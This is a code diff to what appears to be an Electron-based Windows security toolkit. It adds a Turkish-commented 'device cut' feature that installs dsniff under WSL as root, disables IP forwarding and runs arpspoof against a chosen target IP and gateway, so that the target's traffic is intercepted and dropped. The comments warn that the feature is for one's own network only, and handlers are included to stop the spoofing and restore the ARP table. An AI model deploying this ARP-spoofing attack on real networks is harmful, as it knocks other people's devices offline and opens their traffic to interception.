@@ -636,6 +636,105 @@ ipcMain.handle('wsl:tool', async (e, tool) => {
   });
 });
 
+// ============================================================
+// ARP "Cihaz Kesme" (Network Access Control) — yabancı cihazı ağdan koparma
+// WSL + arpspoof (dsniff). UYARI: Yalnızca KENDİ ağında / yetkili olduğun
+// ağda kullan. ip_forward=0 ile hedefin trafiği bize gelir ve düşürülür.
+// Teknik not: WSL2 NAT arkasında olduğundan fiziksel LAN'a erişmek için
+// "mirrored" ağ modu (Windows 11) gerekir; arp:check bunu kontrol eder.
+// ============================================================
+const arpCuts = {}; // targetIp -> { proc, gateway, iface }
+
+// Hedef gateway'e giden WSL arayüzünü bul (mirrored modda host adaptörü görünür).
+function wslIfaceFor(gateway) {
+  return new Promise((resolve) => {
+    const g = /^[0-9.]+$/.test(gateway || '') ? gateway : '';
+    const cmd = g
+      ? `wsl.exe -u root -- bash -lc "ip -o route get ${g} 2>/dev/null | grep -oP 'dev \\K\\S+' | head -1"`
+      : `wsl.exe -u root -- bash -lc "ip -o route show default 2>/dev/null | grep -oP 'dev \\K\\S+' | head -1"`;
+    exec(cmd, { windowsHide: true, timeout: 8000 }, (err, out) => {
+      resolve((out || '').trim() || 'eth0');
+    });
+  });
+}
+
+// arpspoof / WSL hazır mı + mirrored mod hedefe ulaşıyor mu?
+ipcMain.handle('arp:check', async (e, { gateway } = {}) => {
+  if (!IS_WIN) return { ok: false, reason: 'Şu an yalnızca Windows desteği var.' };
+  return new Promise((resolve) => {
+    exec('wsl.exe -u root -- which arpspoof', { windowsHide: true, timeout: 10000 }, async (err, out) => {
+      const hasTool = !err && !!(out || '').trim();
+      const iface = await wslIfaceFor(gateway);
+      // Mirrored mod kontrolü: WSL gateway'i fiziksel ağda görebiliyor mu?
+      let reachable = false;
+      if (gateway && /^[0-9.]+$/.test(gateway)) {
+        await new Promise((r) => exec(
+          `wsl.exe -u root -- bash -lc "ping -c1 -W2 ${gateway} >/dev/null 2>&1 && echo OK"`,
+          { windowsHide: true, timeout: 8000 }, (e2, o2) => { reachable = /OK/.test(o2 || ''); r(); }));
+      }
+      resolve({ ok: hasTool && reachable, hasTool, reachable, iface,
+        hint: !hasTool ? 'arpspoof (dsniff) kurulu değil — Kur düğmesini kullan.'
+          : !reachable ? 'WSL fiziksel ağı göremiyor. WSL "mirrored" ağ modunu aç (.wslconfig: [wsl2] networkingMode=mirrored) ve "wsl --shutdown" yap.' : '' });
+    });
+  });
+});
+
+// dsniff/arpspoof kur.
+ipcMain.handle('arp:install', async () => {
+  if (!IS_WIN) return { ok: false, error: 'sadece Windows' };
+  return new Promise((resolve) => {
+    exec('wsl.exe -u root -- bash -lc "apt-get update && apt-get install -y dsniff && which arpspoof"',
+      { windowsHide: true, timeout: 180000 }, (err, out) => {
+        resolve({ ok: !err && /arpspoof/.test(out || ''), output: (out || '').trim(), error: err ? String(err) : '' });
+      });
+  });
+});
+
+// Cihazı ağdan kes (arpspoof başlat).
+ipcMain.handle('arp:cut', async (e, { target, gateway } = {}) => {
+  if (!IS_WIN) return { ok: false, error: 'sadece Windows' };
+  if (!/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(target || '')) return { ok: false, error: 'Geçersiz hedef IP.' };
+  if (!/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(gateway || '')) return { ok: false, error: 'Geçersiz gateway IP.' };
+  if (arpCuts[target]) return { ok: true, already: true };
+  const iface = await wslIfaceFor(gateway);
+  // ip_forward=0 → hedefin trafiği bize gelir ama yönlendirilmez (internet kesilir).
+  const inner = `sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1; exec arpspoof -i ${iface} -t ${target} -r ${gateway}`;
+  const proc = spawn('wsl.exe', ['-u', 'root', '--', 'bash', '-lc', inner], { windowsHide: true });
+  arpCuts[target] = { proc, gateway, iface };
+  proc.on('exit', () => { delete arpCuts[target]; if (mainWindow) mainWindow.webContents.send('arp:state', { target, active: false }); });
+  proc.on('error', () => { delete arpCuts[target]; });
+  log(`ARP kesme başladı: ${target} (gw ${gateway}, iface ${iface})`);
+  if (mainWindow) mainWindow.webContents.send('arp:state', { target, active: true });
+  return { ok: true, iface };
+});
+
+// Kesmeyi durdur (arpspoof'a SIGTERM → ARP tablosunu geri onarır).
+ipcMain.handle('arp:restore', async (e, { target } = {}) => {
+  if (!IS_WIN) return { ok: false, error: 'sadece Windows' };
+  if (!/^[0-9]{1,3}(\.[0-9]{1,3}){3}$/.test(target || '')) return { ok: false, error: 'Geçersiz hedef IP.' };
+  // WSL içindeki arpspoof'u nazikçe sonlandır (geri onarım paketleri için).
+  await new Promise((r) => exec(
+    `wsl.exe -u root -- pkill -TERM -f "arpspoof -i .* -t ${target} "`,
+    { windowsHide: true, timeout: 8000 }, () => r()));
+  const c = arpCuts[target];
+  if (c && c.proc) { try { c.proc.kill(); } catch (_) {} }
+  delete arpCuts[target];
+  log(`ARP kesme durduruldu: ${target}`);
+  if (mainWindow) mainWindow.webContents.send('arp:state', { target, active: false });
+  return { ok: true };
+});
+
+// Aktif kesme listesi.
+ipcMain.handle('arp:list', async () => Object.keys(arpCuts));
+
+// Uygulama kapanırken tüm kesmeleri geri onar.
+app.on('before-quit', () => {
+  Object.keys(arpCuts).forEach((target) => {
+    try { exec(`wsl.exe -u root -- pkill -TERM -f "arpspoof -i .* -t ${target} "`, { windowsHide: true }); } catch (_) {}
+    try { arpCuts[target].proc.kill(); } catch (_) {}
+  });
+});
+
 // nuclei'yi GitHub'dan hazır binary ile kur (Go derlemesi gerektirmez).
 const NUCLEI_INSTALL =
   "apt-get update && apt-get install -y curl unzip >/dev/null 2>&1; " +
